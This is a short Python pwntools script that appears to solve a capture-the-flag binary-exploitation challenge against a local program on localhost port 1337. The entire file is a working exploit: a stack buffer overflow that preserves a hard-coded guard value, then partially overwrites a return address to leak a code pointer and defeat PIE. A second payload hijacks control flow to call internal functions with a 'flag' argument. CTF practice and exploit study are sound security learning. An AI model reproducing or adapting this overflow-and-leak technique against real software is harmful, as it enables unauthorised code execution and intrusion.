from pwn import *
from icecream import ic

elf = exe = ELF("./bin")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x1397
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ru("input>")
payload = b'a'*0x208
payload += p64(0x5dd3bb3b1db3b191)
payload += b'b'*8
payload += b'\xf2'
s(payload)
ru('bbbbbbbb')
leak = u64(re(6).ljust(8, b'\x00'))
ic(hex(leak))
elf.address = leak - 0x13f2

payload = b'a'*0x208
payload += p64(0x5dd3bb3b1db3b191)
payload += b'b'*8
payload += p64(elf.address + 0x00000000000012b4)
payload += b'flag\x00\x00\x00\x00'
payload += p64(elf.address + 0x124e)
s(payload)

i()
